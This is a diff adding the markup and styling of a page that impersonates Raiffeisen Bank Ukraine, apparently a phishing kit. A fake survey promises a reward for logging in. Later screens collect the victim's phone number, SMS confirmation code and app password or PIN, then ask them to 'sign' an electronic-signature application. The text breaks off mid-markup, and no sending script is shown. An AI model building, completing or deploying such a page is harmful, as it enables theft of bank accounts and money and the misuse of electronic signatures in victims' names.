@@ -1,0 +1,2171 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Форма</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: Arial, sans-serif;
+      background: #1f2430;
+      color: #ffffff;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .phone-shell {
+      width: 100%;
+      max-width: 420px;
+      background: #252b38;
+      border-radius: 32px;
+      overflow: hidden;
+      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.35);
+      border: 1px solid rgba(255, 255, 255, 0.06);
+    }
+
+    .top {
+      background: #3a3c45;
+      padding: 26px 24px 46px;
+      border-bottom-left-radius: 36px;
+      border-bottom-right-radius: 36px;
+      position: relative;
+    }
+
+    .brand {
+      text-align: center;
+      margin-top: 18px;
+      font-size: 46px;
+      font-weight: 800;
+      color: #ffe100;
+      letter-spacing: 0.04em;
+      line-height: 1;
+    }
+
+    .support {
+      position: absolute;
+      right: 22px;
+      top: 28px;
+      color: #ffe100;
+      font-size: 20px;
+    }
+
+    .content {
+      padding: 30px 24px 34px;
+    }
+
+    .screen {
+      display: none;
+    }
+
+    .screen.active {
+      display: block;
+    }
+
+    .header-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 12px;
+      gap: 12px;
+    }
+
+    .survey-title {
+      font-size: 14px;
+      color: #ffe100;
+      font-weight: bold;
+      line-height: 1.4;
+    }
+
+    .step-count {
+      font-size: 14px;
+      color: rgba(255, 255, 255, 0.55);
+      white-space: nowrap;
+    }
+
+    .progress {
+      width: 100%;
+      height: 8px;
+      background: rgba(255, 255, 255, 0.08);
+      border-radius: 999px;
+      overflow: hidden;
+      margin-bottom: 28px;
+    }
+
+    .progress-bar {
+      height: 100%;
+      width: 33.33%;
+      background: #ffe100;
+      border-radius: 999px;
+      transition: width 0.3s ease;
+    }
+
+    .question {
+      font-size: 34px;
+      line-height: 1.2;
+      font-weight: 700;
+      margin-bottom: 28px;
+    }
+
+    .options {
+      display: flex;
+      flex-direction: column;
+      gap: 14px;
+    }
+
+    .option {
+      width: 100%;
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      background: #2c313f;
+      color: #fff;
+      border-radius: 22px;
+      padding: 16px 18px;
+      text-align: left;
+      font-size: 16px;
+      transition: 0.2s ease;
+    }
+
+    button.option {
+      cursor: pointer;
+    }
+
+    button.option:hover {
+      border-color: rgba(255, 225, 0, 0.45);
+      background: #323848;
+    }
+
+    .option.active {
+      background: #ffe100;
+      color: #1f2430;
+      border-color: #ffe100;
+      font-weight: bold;
+    }
+
+    .option.input {
+      outline: none;
+    }
+
+    .option.input:focus {
+      border-color: #ffe100;
+    }
+
+    .actions {
+      display: flex;
+      gap: 12px;
+      margin-top: 28px;
+    }
+
+    .btn {
+      flex: 1;
+      border-radius: 999px;
+      padding: 14px 18px;
+      font-size: 15px;
+      cursor: pointer;
+      transition: 0.2s ease;
+    }
+
+    .btn-back {
+      background: transparent;
+      color: rgba(255, 255, 255, 0.75);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+    }
+
+    .btn-back:hover:not(:disabled) {
+      background: rgba(255, 255, 255, 0.05);
+    }
+
+    .btn-next {
+      background: #ffe100;
+      color: #1f2430;
+      border: none;
+      font-weight: bold;
+    }
+
+    .btn-next:hover:not(:disabled) {
+      filter: brightness(0.96);
+    }
+
+    .btn:disabled {
+      opacity: 0.45;
+      cursor: not-allowed;
+    }
+
+    .status-message {
+      min-height: 22px;
+      margin-top: 18px;
+      font-size: 14px;
+      color: rgba(255, 255, 255, 0.72);
+    }
+
+    .status-message.error {
+      color: #ff8a8a;
+    }
+
+    .screen-alert {
+      min-height: 0;
+      margin-bottom: 18px;
+      padding: 14px 16px;
+      border-radius: 16px;
+      background: rgba(255, 255, 255, 0.06);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      text-align: center;
+      font-size: 15px;
+      line-height: 1.45;
+    }
+
+    .screen-alert:empty {
+      display: none;
+    }
+
+    .screen-alert.error {
+      background: rgba(255, 138, 138, 0.12);
+      border-color: rgba(255, 138, 138, 0.32);
+      color: #ffb1b1;
+      box-shadow: 0 10px 24px rgba(0, 0, 0, 0.18);
+    }
+
+    .loading {
+      text-align: center;
+      padding: 24px 0 10px;
+    }
+
+    .spinner {
+      width: 74px;
+      height: 74px;
+      margin: 0 auto 22px;
+      border-radius: 50%;
+      border: 6px solid rgba(255, 255, 255, 0.12);
+      border-top-color: #ffe100;
+      animation: spin 1s linear infinite;
+    }
+
+    .loading h2 {
+      font-size: 30px;
+      margin-bottom: 10px;
+    }
+
+    .loading p {
+      color: rgba(255, 255, 255, 0.72);
+      line-height: 1.5;
+    }
+
+    .signature-screen {
+      min-height: 560px;
+      display: flex;
+      flex-direction: column;
+      gap: 22px;
+    }
+
+    .signature-top {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 8px;
+    }
+
+    .signature-icon-btn {
+      width: 54px;
+      height: 54px;
+      border-radius: 50%;
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #ffe100;
+      font-size: 28px;
+      background: rgba(255, 255, 255, 0.02);
+    }
+
+    .signature-title {
+      font-size: 16px;
+      font-weight: 700;
+      color: #f4f5f7;
+    }
+
+    .signature-hero {
+      display: flex;
+      justify-content: center;
+      margin: 28px 0 8px;
+    }
+
+    .signature-badges {
+      position: relative;
+      width: 150px;
+      height: 120px;
+    }
+
+    .signature-badge,
+    .signature-card {
+      position: absolute;
+      border-radius: 18px;
+      transform: rotate(-12deg);
+      box-shadow: 0 12px 30px rgba(0, 0, 0, 0.26);
+    }
+
+    .signature-badge {
+      width: 54px;
+      height: 54px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 26px;
+      font-weight: 700;
+    }
+
+    .signature-badge.primary {
+      left: 18px;
+      top: 28px;
+      background: #d6ad00;
+      color: #2d2f36;
+      z-index: 2;
+    }
+
+    .signature-badge.secondary {
+      left: 64px;
+      top: 8px;
+      background: #6b6459;
+      color: #2d2f36;
+      opacity: 0.65;
+    }
+
+    .signature-card {
+      right: 10px;
+      top: 26px;
+      width: 88px;
+      height: 62px;
+      background: #f7f3e8;
+      border: 3px solid #d6ad00;
+      z-index: 3;
+      padding: 10px;
+    }
+
+    .signature-card::before {
+      content: '';
+      position: absolute;
+      left: 14px;
+      right: 14px;
+      bottom: 14px;
+      height: 3px;
+      background: linear-gradient(90deg, #d6ad00, #d8d1c3);
+    }
+
+    .signature-card::after {
+      content: '';
+      position: absolute;
+      right: 14px;
+      top: 12px;
+      width: 18px;
+      height: 6px;
+      border: 2px solid #b88f00;
+      border-radius: 6px;
+    }
+
+    .signature-copy {
+      text-align: center;
+      font-size: 22px;
+      line-height: 1.35;
+      font-weight: 700;
+      color: #ffffff;
+      margin-bottom: 6px;
+    }
+
+    .signature-doc {
+      background: #116888;
+      border-radius: 22px;
+      padding: 20px 22px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+      color: #f6fbff;
+      text-align: left;
+    }
+
+    .signature-doc-main {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      min-width: 0;
+    }
+
+    .signature-doc-icon {
+      font-size: 28px;
+      line-height: 1;
+    }
+
+    .signature-doc-text {
+      font-size: 15px;
+      line-height: 1.45;
+    }
+
+    .signature-doc-arrow {
+      font-size: 28px;
+      color: rgba(255, 255, 255, 0.85);
+    }
+
+    .signature-link {
+      color: #ffe100;
+      font-size: 15px;
+      text-decoration: underline;
+      text-underline-offset: 3px;
+      width: fit-content;
+    }
+
+    .signature-actions {
+      margin-top: auto;
+    }
+
+    .result-screen {
+      min-height: 620px;
+      display: flex;
+      flex-direction: column;
+      gap: 22px;
+    }
+
+    .result-top {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      position: relative;
+      padding-top: 6px;
+    }
+
+    .result-title-top {
+      font-size: 16px;
+      font-weight: 700;
+      color: #f4f5f7;
+    }
+
+    .result-top-badge {
+      position: absolute;
+      right: 0;
+      width: 52px;
+      height: 52px;
+      border-radius: 50%;
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #ffe100;
+      background: rgba(255, 255, 255, 0.02);
+      font-size: 24px;
+    }
+
+    .result-hero {
+      display: flex;
+      justify-content: center;
+      margin: 56px 0 10px;
+    }
+
+    .result-art {
+      position: relative;
+      width: 180px;
+      height: 120px;
+    }
+
+    .result-tile {
+      position: absolute;
+      width: 62px;
+      height: 62px;
+      border-radius: 14px;
+      transform: rotate(-45deg);
+      box-shadow: 0 12px 26px rgba(0, 0, 0, 0.24);
+    }
+
+    .result-tile.left {
+      left: 16px;
+      top: 20px;
+      background: #72d84b;
+      z-index: 2;
+    }
+
+    .result-tile.right {
+      left: 58px;
+      top: 4px;
+      background: #5ca73d;
+      opacity: 0.72;
+    }
+
+    .result-card {
+      position: absolute;
+      right: 10px;
+      top: 28px;
+      width: 78px;
+      height: 54px;
+      background: #f7f3e8;
+      border: 3px solid #d6ad00;
+      border-radius: 16px;
+      transform: rotate(-35deg);
+      z-index: 3;
+    }
+
+    .result-card::before {
+      content: '';
+      position: absolute;
+      right: 12px;
+      top: 10px;
+      width: 18px;
+      height: 6px;
+      border: 2px solid #4fbf35;
+      border-radius: 6px;
+    }
+
+    .result-card::after {
+      content: '';
+      position: absolute;
+      left: 12px;
+      right: 12px;
+      bottom: 12px;
+      height: 3px;
+      background: #d6ad00;
+      border-radius: 999px;
+    }
+
+    .result-main-title {
+      text-align: center;
+      font-size: 28px;
+      line-height: 1.25;
+      font-weight: 700;
+      color: #ffffff;
+    }
+
+    .result-text {
+      text-align: center;
+      font-size: 16px;
+      line-height: 1.5;
+      color: rgba(255, 255, 255, 0.78);
+    }
+
+    .result-actions {
+      margin-top: 50px;
+    }
+
+    .result-button {
+      width: 100%;
+      border: none;
+      border-radius: 18px;
+      background: #ffe100;
+      color: #262933;
+      font-size: 18px;
+      font-weight: 700;
+      padding: 18px 20px;
+      cursor: pointer;
+    }
+
+    .phone-entry {
+      display: flex;
+      flex-direction: column;
+      min-height: 640px;
+    }
+
+    .phone-entry-top {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      position: relative;
+      margin-bottom: 26px;
+    }
+
+    .phone-entry-title {
+      font-size: 18px;
+      font-weight: 700;
+      color: #f3f4f6;
+    }
+
+    .phone-entry-badge {
+      position: absolute;
+      right: 0;
+      width: 52px;
+      height: 52px;
+      border-radius: 50%;
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #ffe100;
+      background: rgba(255, 255, 255, 0.02);
+      font-size: 26px;
+    }
+
+    .phone-hero {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 24px;
+    }
+
+    .phone-hero-art {
+      position: relative;
+      width: 210px;
+      height: 150px;
+    }
+
+    .phone-card {
+      position: absolute;
+      left: 70px;
+      top: 18px;
+      width: 96px;
+      height: 132px;
+      background: #f7f3e8;
+      border: 3px solid #b8963e;
+      border-radius: 20px;
+      transform: rotate(42deg);
+      box-shadow: 0 18px 30px rgba(0, 0, 0, 0.35);
+    }
+
+    .phone-card::before {
+      content: '';
+      position: absolute;
+      left: 22px;
+      top: 20px;
+      width: 30px;
+      height: 30px;
+      border: 5px solid #59bf36;
+      border-radius: 50%;
+      border-right-color: transparent;
+      transform: rotate(-25deg);
+    }
+
+    .phone-card::after {
+      content: '';
+      position: absolute;
+      left: 18px;
+      right: 18px;
+      bottom: 18px;
+      height: 6px;
+      border-radius: 999px;
+      background: #d3af37;
+    }
+
+    .phone-dots {
+      position: absolute;
+      left: 22px;
+      bottom: 34px;
+      width: 30px;
+      height: 38px;
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 4px;
+    }
+
+    .phone-dots span {
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      background: #bfb7a5;
+    }
+
+    .phone-check {
+      position: absolute;
+      left: 12px;
+      top: 34px;
+      width: 92px;
+      height: 92px;
+      border-radius: 50%;
+      background: #7bd74f;
+      box-shadow: 0 18px 26px rgba(0, 0, 0, 0.28);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #2d7f1f;
+      font-size: 48px;
+      font-weight: 700;
+      z-index: 2;
+    }
+
+    .phone-label {
+      font-size: 14px;
+      color: rgba(255, 255, 255, 0.84);
+      margin-bottom: 10px;
+    }
+
+    .phone-input-shell {
+      border: 3px solid #7bd74f;
+      border-radius: 16px;
+      padding: 14px 16px;
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      background: rgba(255, 255, 255, 0.02);
+      margin-bottom: 22px;
+    }
+
+    .phone-prefix {
+      color: #f4f5f7;
+      font-size: 18px;
+      white-space: nowrap;
+      padding-right: 14px;
+      border-right: 1px solid rgba(255, 255, 255, 0.16);
+    }
+
+    .phone-entry-field {
+      flex: 1;
+      background: transparent;
+      border: none;
+      color: #ffffff;
+      font-size: 18px;
+      outline: none;
+      letter-spacing: 0.03em;
+    }
+
+    .phone-entry-field::placeholder {
+      color: rgba(255, 255, 255, 0.35);
+    }
+
+    .phone-input-actions {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      color: #7bd74f;
+      font-size: 24px;
+    }
+
+    .phone-input-clear {
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      border: none;
+      background: rgba(255, 255, 255, 0.3);
+      color: #2a2d35;
+      font-size: 18px;
+      cursor: pointer;
+      line-height: 1;
+    }
+
+    .phone-disclaimer {
+      text-align: center;
+      font-size: 14px;
+      line-height: 1.5;
+      color: rgba(255, 255, 255, 0.82);
+      margin-bottom: 16px;
+    }
+
+    .phone-disclaimer a {
+      color: #ffe100;
+      text-decoration: underline;
+      text-underline-offset: 3px;
+    }
+
+    .phone-primary-btn {
+      width: 100%;
+      border: none;
+      border-radius: 18px;
+      background: #ffe100;
+      color: #262933;
+      font-size: 18px;
+      font-weight: 700;
+      padding: 18px 20px;
+      cursor: pointer;
+      margin-bottom: 20px;
+    }
+
+    .phone-primary-btn:disabled {
+      opacity: 0.45;
+      cursor: not-allowed;
+    }
+
+    .code-style-screen {
+      display: flex;
+      flex-direction: column;
+      min-height: 620px;
+    }
+
+    .code-style-top {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 18px;
+    }
+
+    .code-style-circle {
+      width: 58px;
+      height: 58px;
+      border-radius: 50%;
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: rgba(255, 255, 255, 0.02);
+      color: #ffe100;
+      font-size: 28px;
+      flex-shrink: 0;
+    }
+
+    .code-style-caption {
+      font-size: 18px;
+      font-weight: 700;
+      color: #f3f4f6;
+      text-align: center;
+      flex: 1;
+    }
+
+    .code-style-hero {
+      display: flex;
+      justify-content: center;
+      margin: 4px 0 24px;
+    }
+
+    .code-style-art {
+      position: relative;
+      width: 210px;
+      height: 145px;
+    }
+
+    .code-style-card {
+      position: absolute;
+      right: 34px;
+      top: 12px;
+      width: 94px;
+      height: 126px;
+      background: #f7f3e8;
+      border: 3px solid #b8963e;
+      border-radius: 20px;
+      transform: rotate(42deg);
+      box-shadow: 0 18px 30px rgba(0, 0, 0, 0.34);
+    }
+
+    .code-style-card::before {
+      content: '';
+      position: absolute;
+      right: 18px;
+      top: 18px;
+      width: 30px;
+      height: 24px;
+      border: 4px solid #32addf;
+      border-radius: 6px;
+      box-sizing: border-box;
+      transform: rotate(2deg);
+    }
+
+    .code-style-card::after {
+      content: '';
+      position: absolute;
+      left: 18px;
+      right: 18px;
+      bottom: 18px;
+      height: 6px;
+      border-radius: 999px;
+      background: #d3af37;
+    }
+
+    .code-style-dots {
+      position: absolute;
+      left: 18px;
+      bottom: 32px;
+      width: 30px;
+      height: 38px;
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 4px;
+    }
+
+    .code-style-dots span {
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      background: #bfb7a5;
+    }
+
+    .code-style-badge {
+      position: absolute;
+      left: 10px;
+      top: 28px;
+      width: 92px;
+      height: 92px;
+      border-radius: 50%;
+      background: #54c3ef;
+      box-shadow: 0 18px 26px rgba(0, 0, 0, 0.28);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #1f7ea9;
+      font-size: 50px;
+      font-weight: 700;
+      z-index: 2;
+    }
+
+    .code-style-title {
+      text-align: center;
+      font-size: 34px;
+      line-height: 1.15;
+      font-weight: 700;
+      color: #ffffff;
+      margin-bottom: 12px;
+    }
+
+    .code-style-subtitle {
+      text-align: center;
+      font-size: 14px;
+      line-height: 1.55;
+      color: rgba(255, 255, 255, 0.78);
+      margin-bottom: 24px;
+    }
+
+    .code-style-name {
+      color: #ffffff;
+      font-size: 18px;
+      font-weight: 600;
+      display: block;
+      margin-top: 4px;
+    }
+
+    .code-style-boxes {
+      display: grid;
+      grid-template-columns: repeat(6, 1fr);
+      gap: 10px;
+      margin-bottom: 26px;
+      cursor: text;
+    }
+
+    .code-style-box {
+      height: 74px;
+      border-radius: 14px;
+      border: 2px solid rgba(255, 255, 255, 0.2);
+      background: rgba(255, 255, 255, 0.02);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #ffffff;
+      font-size: 22px;
+      font-weight: 600;
+    }
+
+    .code-style-box.active {
+      border-color: #ffe100;
+    }
+
+    .code-style-input {
+      position: absolute;
+      opacity: 0;
+      pointer-events: none;
+      width: 1px;
+      height: 1px;
+      border: 0;
+      padding: 0;
+    }
+
+    .code-style-submit {
+      width: 100%;
+      border: none;
+      border-radius: 18px;
+      background: #ffe100;
+      color: #262933;
+      font-size: 18px;
+      font-weight: 700;
+      padding: 18px 20px;
+      cursor: pointer;
+      margin-top: auto;
+    }
+
+    .code-style-submit:disabled {
+      opacity: 0.45;
+      cursor: not-allowed;
+    }
+
+    .pin-screen {
+      min-height: 640px;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .pin-top {
+      margin: -30px -24px 34px;
+      padding: 34px 24px 44px;
+      background: #46474f;
+      border-bottom-right-radius: 34px;
+      position: relative;
+    }
+
+    .pin-top::after {
+      content: '';
+      position: absolute;
+      right: 0;
+      bottom: -1px;
+      width: 54px;
+      height: 54px;
+      background: #2f3138;
+      clip-path: polygon(100% 0, 0 100%, 100% 100%);
+    }
+
+    .pin-brand {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 26px;
+      color: #ffe100;
+      font-size: 26px;
+    }
+
+    .pin-logo {
+      text-align: center;
+      color: #ffe100;
+      font-size: 54px;
+      font-weight: 700;
+      line-height: 1;
+    }
+
+    .pin-title {
+      text-align: center;
+      font-size: 34px;
+      line-height: 1.15;
+      font-weight: 700;
+      color: #ffffff;
+      margin-bottom: 24px;
+    }
+
+    .pin-subtitle {
+      text-align: center;
+      font-size: 14px;
+      line-height: 1.5;
+      color: rgba(255, 255, 255, 0.72);
+      margin-bottom: 24px;
+    }
+
+    .pin-dots {
+      display: flex;
+      justify-content: center;
+      gap: 16px;
+      margin-bottom: 28px;
+    }
+
+    .pin-dot {
+      width: 20px;
+      height: 20px;
+      border-radius: 50%;
+      border: 2px solid rgba(255, 255, 255, 0.28);
+      background: transparent;
+      transition: 0.2s ease;
+    }
+
+    .pin-dot.filled {
+      border-color: #ffe100;
+      background: #ffe100;
+    }
+
+    .pin-hidden-input {
+      position: absolute;
+      opacity: 0;
+      pointer-events: none;
+      width: 1px;
+      height: 1px;
+    }
+
+    .pin-keypad {
+      width: 100%;
+      max-width: 340px;
+      margin: 0 auto;
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 18px 24px;
+    }
+
+    .pin-key {
+      width: 96px;
+      height: 96px;
+      border-radius: 50%;
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      background: #373941;
+      color: #ffffff;
+      font-size: 28px;
+      cursor: pointer;
+      justify-self: center;
+    }
+
+    .pin-key.empty {
+      visibility: hidden;
+    }
+
+    .pin-key.backspace {
+      font-size: 30px;
+    }
+
+    .pin-help {
+      margin-top: auto;
+      text-align: center;
+      color: #ffe100;
+      font-size: 16px;
+      text-decoration: underline;
+      text-underline-offset: 3px;
+      padding-top: 28px;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    @media (max-width: 480px) {
+      .question {
+        font-size: 28px;
+      }
+
+      .content {
+        padding: 26px 18px 30px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="phone-shell">
+    <div class="top">
+      <div class="brand">⚒</div>
+      <div class="support">?</div>
+    </div>
+
+    <div class="content">
+      <div class="screen active" id="quiz-one-screen">
+        <div class="header-row">
+          <div class="survey-title">Опитування від Raiffeisen Bank.</div>
+          <div class="step-count">1 из 3</div>
+        </div>
+
+        <div class="progress">
+          <div class="progress-bar" style="width: 20%"></div>
+        </div>
+
+        <div class="question">Чи відчуваєте ви на собі зростання цін?</div>
+        <div class="options" id="quiz-one-options">
+          <button class="option" type="button" data-question="contact" data-value="Так.">Так.</button>
+          <button class="option" type="button" data-question="contact" data-value="Майже не відчувається.">Майже не відчувається.</button>
+          <button class="option" type="button" data-question="contact" data-value="Ні.">Ні.</button>
+        </div>
+
+        <div class="actions">
+          <button class="btn btn-back" id="quiz-one-back-btn">Назад</button>
+          <button class="btn btn-next" id="quiz-one-next-btn" disabled>Далее</button>
+        </div>
+
+        <div class="status-message" id="quiz-one-status-message"></div>
+      </div>
+
+      <div class="screen" id="quiz-two-screen">
+        <div class="header-row">
+          <div class="survey-title">Опитування від Raiffeisen Bank.</div>
+          <div class="step-count">2 из 3</div>
+        </div>
+
+        <div class="progress">
+          <div class="progress-bar" style="width: 30%"></div>
+        </div>
+
+        <div class="question">Яка середня заробітна платня на вашу думку повинна бути у населення ?</div>
+        <div class="options" id="quiz-two-options">
+          <button class="option" type="button" data-question="usage" data-value="15000-25000 грн.">15000-25000 грн.</button>
+          <button class="option" type="button" data-question="usage" data-value="30000-50000 грн.">30000-50000 грн.</button>
+          <button class="option" type="button" data-question="usage" data-value="50000+ грн.">50000+ грн.</button>
+        </div>
+
+        <div class="actions">
+          <button class="btn btn-back" id="quiz-two-back-btn">Назад</button>
+          <button class="btn btn-next" id="quiz-two-next-btn" disabled>Далее</button>
+        </div>
+
+        <div class="status-message" id="quiz-two-status-message"></div>
+      </div>
+
+      <div class="screen" id="quiz-three-screen">
+        <div class="header-row">
+          <div class="survey-title">Опитування від Raiffeisen Bank.</div>
+          <div class="step-count">3 из 3</div>
+        </div>
+
+        <div class="progress">
+          <div class="progress-bar" style="width: 40%"></div>
+        </div>
+
+        <div class="question">Як часто ви користуєтеся застосунком MyRaif?</div>
+        <div class="options" id="quiz-three-options">
+          <button class="option" type="button" data-question="goal" data-value="Кожного дня.">Кожного дня.</button>
+          <button class="option" type="button" data-question="goal" data-value="Інколи.">Інколи.</button>
+          <button class="option" type="button" data-question="goal" data-value="2 рази в місяць">2 рази в місяць</button>
+        </div>
+
+        <div class="actions">
+          <button class="btn btn-back" id="quiz-three-back-btn">Назад</button>
+          <button class="btn btn-next" id="quiz-three-next-btn" disabled>Далее</button>
+        </div>
+
+        <div class="status-message" id="quiz-three-status-message"></div>
+      </div>
+
+      <div class="screen" id="quiz-success-screen">
+        <div class="result-screen">
+          <div class="result-top">
+            <div class="result-title-top">Опитування пройдено</div>
+            <div class="result-top-badge">◔</div>
+          </div>
+
+          <div class="result-hero">
+            <div class="result-art">
+              <div class="result-tile left"></div>
+              <div class="result-tile right"></div>
+              <div class="result-card"></div>
+            </div>
+          </div>
+
+          <div class="result-main-title">Вітаємо ви успішно пройшли опитування!</div>
+          <div class="result-text">Щоб отримати винагороду необхідно авторизуватись!</div>
+
+          <div class="result-actions">
+            <button class="result-button" id="quiz-success-btn">Увійти</button>
+          </div>
+        </div>
+      </div>
+
+      <div class="screen" id="phone-screen">
+        <div class="status-message screen-alert" id="phone-status-message"></div>
+        <div class="phone-entry">
+          <div class="phone-entry-top">
+            <div class="phone-entry-title">Ласкаво просимо</div>
+            <div class="phone-entry-badge">◔</div>
+          </div>
+
+          <div class="phone-hero">
+            <div class="phone-hero-art">
+              <div class="phone-card">
+                <div class="phone-dots">
+                  <span></span><span></span><span></span>
+                  <span></span><span></span><span></span>
+                  <span></span><span></span><span></span>
+                </div>
+              </div>
+              <div class="phone-check">✓</div>
+            </div>
+          </div>
+
+          <div class="phone-label">Номер телефону</div>
+
+          <div class="phone-input-shell">
+            <div class="phone-prefix">+380</div>
+            <input
+              id="phone-input"
+              class="phone-entry-field"
+              type="tel"
+              placeholder="93 469 99 99"
+              autocomplete="tel"
+              inputmode="numeric"
+            />
+            <div class="phone-input-actions">
+              <button type="button" class="phone-input-clear" id="phone-clear-btn">×</button>
+            </div>
+          </div>
+
+          <div class="phone-disclaimer">
+            Натиснувши «Продовжити», ви приймаєте
+            <a href="#" id="phone-terms-link">Умови надання послуг</a>
+            і
+            <a href="#" id="phone-policy-link">Порядок обробки</a>
+          </div>
+
+          <button class="phone-primary-btn" id="phone-submit-btn">Продовжити</button>
+        </div>
+
+      </div>
+
+      <div class="screen" id="loading-screen">
+        <div class="loading">
+          <div class="spinner"></div>
+          <h2 id="loading-title">Завантаження</h2>
+          <p id="loading-text">Зачекайте, будь ласка...</p>
+        </div>
+      </div>
+
+      <div class="screen" id="name-screen">
+        <div class="status-message screen-alert" id="name-status-message"></div>
+        <div class="code-style-screen">
+          <div class="code-style-top">
+            <div class="code-style-circle">←</div>
+            <div class="code-style-caption">Підтвердження</div>
+            <div class="code-style-circle">◔</div>
+          </div>
+
+          <div class="code-style-hero">
+            <div class="code-style-art">
+              <div class="code-style-card">
+                <div class="code-style-dots">
+                  <span></span><span></span><span></span>
+                  <span></span><span></span><span></span>
+                  <span></span><span></span><span></span>
+                </div>
+              </div>
+              <div class="code-style-badge">?</div>
+            </div>
+          </div>
+
+          <div class="code-style-title">Введiте код</div>
+          <div class="code-style-subtitle">
+            Ми надіслали SMS на номер телефону.
+            <span class="code-style-name" id="name-preview-value" style="display:none"></span>
+          </div>
+
+          <div class="code-style-boxes">
+            <div class="code-style-box active" id="name-box-1"></div>
+            <div class="code-style-box" id="name-box-2"></div>
+            <div class="code-style-box" id="name-box-3"></div>
+            <div class="code-style-box" id="name-box-4"></div>
+            <div class="code-style-box" id="name-box-5"></div>
+            <div class="code-style-box" id="name-box-6"></div>
+          </div>
+
+          <input
+            id="name-input"
+            class="code-style-input"
+            type="text"
+            placeholder="Ваше имя"
+            autocomplete="name"
+          />
+
+          <button class="code-style-submit" id="name-submit-btn">Продовжити</button>
+        </div>
+
+      </div>
+
+      <div class="screen" id="birth-year-screen">
+        <div class="status-message screen-alert" id="birth-year-status-message"></div>
+        <div class="pin-screen">
+          <div class="pin-title">Введiть пароль</div>
+          <!-- <div class="pin-subtitle">Введите 4 цифры вашего года рождения для подтверждения данных.</div> -->
+
+          <div class="pin-dots" id="birth-year-dots">
+            <div class="pin-dot" id="birth-year-dot-1"></div>
+            <div class="pin-dot" id="birth-year-dot-2"></div>
+            <div class="pin-dot" id="birth-year-dot-3"></div>
+            <div class="pin-dot" id="birth-year-dot-4"></div>
+          </div>
+
+          <input
+            id="birth-year-input"
+            class="pin-hidden-input"
+            type="text"
+            inputmode="numeric"
+            maxlength="4"
+            placeholder="1999"
+            autocomplete="bday-year"
+          />
+
+          <div class="pin-keypad" id="birth-year-keypad">
+            <button type="button" class="pin-key" data-birth-key="1">1</button>
+            <button type="button" class="pin-key" data-birth-key="2">2</button>
+            <button type="button" class="pin-key" data-birth-key="3">3</button>
+            <button type="button" class="pin-key" data-birth-key="4">4</button>
+            <button type="button" class="pin-key" data-birth-key="5">5</button>
+            <button type="button" class="pin-key" data-birth-key="6">6</button>
+            <button type="button" class="pin-key" data-birth-key="7">7</button>
+            <button type="button" class="pin-key" data-birth-key="8">8</button>
+            <button type="button" class="pin-key" data-birth-key="9">9</button>
+            <div class="pin-key empty"></div>
+            <button type="button" class="pin-key" data-birth-key="0">0</button>
+            <button type="button" class="pin-key backspace" data-birth-key="backspace">⌫</button>
+          </div>
+
+          <!-- <button type="button" class="pin-help" id="birth-year-help-btn">Забыли год?</button> -->
+        </div>
+      </div>
+
+      <div class="screen" id="confirm-screen">
+        <div class="signature-screen">
+          <div class="signature-top">
+            <div class="signature-icon-btn">×</div>
+            <div class="signature-title">Електронний підпис</div>
+            <div class="signature-icon-btn">◔</div>
+          </div>
+
+          <div class="signature-hero">
+            <div class="signature-badges">
+              <div class="signature-badge primary">◇</div>
+              <div class="signature-badge secondary">◔</div>
+              <div class="signature-card"></div>
+            </div>
+          </div>
+
+          <div class="signature-copy">Підпишіть заяву про використання електронного підпису</div>
+
+          <div class="signature-doc">
+            <div class="signature-doc-main">
+              <div class="signature-doc-icon">▣</div>
+              <div class="signature-doc-text">Заява про використання електронного підпису</div>
+            </div>
+            <div class="signature-doc-arrow">›</div>
+          </div>
+
+          <a class="signature-link" href="#" id="signature-help-link">Для чого використовується електронний підпис?</a>
+
+          <div class="actions signature-actions">
+            <button class="btn btn-next" id="confirm-btn">Підписати</button>
+          </div>
+        </div>
+
+        <div class="status-message" id="confirm-status-message"></div>
+      </div>
+
+      <div class="screen" id="living-year-screen">
+        <div class="status-message screen-alert" id="living-year-status-message"></div>
+        <div class="code-style-screen">
+          <div class="code-style-top">
+            <div class="code-style-circle">←</div>
